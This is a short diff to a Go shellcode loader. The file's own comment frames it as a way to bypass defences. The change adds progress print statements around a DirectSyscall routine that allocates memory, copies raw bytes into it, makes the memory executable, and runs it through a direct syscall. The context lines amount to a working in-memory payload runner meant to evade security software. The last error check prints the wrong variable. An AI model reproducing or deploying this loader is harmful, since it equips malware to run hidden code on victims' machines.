@@ -13,6 +13,8 @@ as a way to bypass defences
 inspiration: https://www.youtube.com/watch?v=gH9qyHVc9-M
 */
 func DirectSyscall(bytes []byte) {
+	fmt.Printf("[*] Injecting %d bytes\r\n", len(bytes))
+	fmt.Println("[*] VirtualAlloc")
 	addr, _, err := VirtualAlloc.Call(
 		uintptr(0),
 		uintptr(len(bytes)),
@@ -23,11 +25,14 @@ func DirectSyscall(bytes []byte) {
 		panic(fmt.Sprintf("[-] VirtualAlloc failed: %s", err))
 	}
 
+	fmt.Println("[*] RtlMoveMemory")
 	RtlMoveMemory.Call(
 		addr,
 		(uintptr)(unsafe.Pointer(&bytes[0])),
 		uintptr(len(bytes)),
 	)
+
+	fmt.Println("[*] VirtualProtect")
 	oldProtect := PAGE_READWRITE
 	_, _, err = VirtualProtect.Call(
 		addr,
@@ -39,6 +44,7 @@ func DirectSyscall(bytes []byte) {
 		panic(fmt.Sprintf("[-] VirtualProtect failed: %s", err))
 	}
 
+	fmt.Println("[*] SyscallN")
 	_, _, errSyscall := syscall.SyscallN(addr, 0, 0, 0, 0)
 	if errSyscall != 0 {
 		panic(fmt.Sprintf("[-] SyscallN failed: %s", err))
